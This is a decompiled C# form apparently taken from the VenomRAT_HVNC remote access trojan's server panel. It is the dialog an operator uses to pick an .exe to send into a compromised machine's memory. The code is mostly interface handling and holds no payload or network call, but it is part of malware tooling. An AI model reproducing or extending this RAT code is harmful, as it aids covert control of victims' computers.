using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using VenomRAT_HVNC.Server.Helper;

namespace VenomRAT_HVNC.Server
{
    // Token: 0x02000034 RID: 52
    public partial class FormSendFileToMemory : Form
    {
        // Token: 0x060001CA RID: 458 RVA: 0x0001958D File Offset: 0x0001958D
        public FormSendFileToMemory()
        {
            this.InitializeComponent();
        }

        // Token: 0x060001CB RID: 459 RVA: 0x0001959B File Offset: 0x0001959B
        private void SendFileToMemory_Load(object sender, EventArgs e)
        {
            this.comboBox1.SelectedIndex = 0;
            this.comboBox2.SelectedIndex = 0;
        }

        // Token: 0x060001CC RID: 460 RVA: 0x000195B8 File Offset: 0x000195B8
        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            int selectedIndex = this.comboBox1.SelectedIndex;
            if (selectedIndex == 0)
            {
                this.label3.Visible = false;
                this.comboBox2.Visible = false;
                return;
            }
            if (selectedIndex != 1)
            {
                return;
            }
            this.label3.Visible = true;
            this.comboBox2.Visible = true;
        }

        // Token: 0x060001CD RID: 461 RVA: 0x0001960C File Offset: 0x0001960C
        private void button1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "(*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    this.toolStripStatusLabel1.Text = Path.GetFileName(openFileDialog.FileName);
                    this.toolStripStatusLabel1.Tag = openFileDialog.FileName;
                    this.toolStripStatusLabel1.ForeColor = Color.Green;
                    this.IsOK = true;
                    if (this.comboBox1.SelectedIndex != 0)
                    {
                        goto IL_DD;
                    }
                    try
                    {
                        new ReferenceLoader().AppDomainSetup(openFileDialog.FileName);
                        this.IsOK = true;
                        return;
                    }
                    catch
                    {
                        this.toolStripStatusLabel1.ForeColor = Color.Red;
                        ToolStripStatusLabel toolStripStatusLabel = this.toolStripStatusLabel1;
                        toolStripStatusLabel.Text += " Invalid!";
                        this.IsOK = false;
                        return;
                    }
                }
                this.toolStripStatusLabel1.Text = "";
                this.toolStripStatusLabel1.ForeColor = Color.Black;
                this.IsOK = true;
            IL_DD:;
            }
        }

        // Token: 0x060001CE RID: 462 RVA: 0x00019720 File Offset: 0x00019720
        private void button2_Click(object sender, EventArgs e)
        {
            if (this.IsOK)
            {
                base.Hide();
            }
        }

        // Token: 0x060001CF RID: 463 RVA: 0x00019730 File Offset: 0x00019730
        private void Button3_Click(object sender, EventArgs e)
        {
            this.IsOK = false;
            base.Hide();
        }

        // Token: 0x060001D0 RID: 464 RVA: 0x000067A9 File Offset: 0x000067A9
        private void guna2GroupBox1_Click(object sender, EventArgs e)
        {
        }

        // Token: 0x040001C4 RID: 452
        public bool IsOK;
    }
}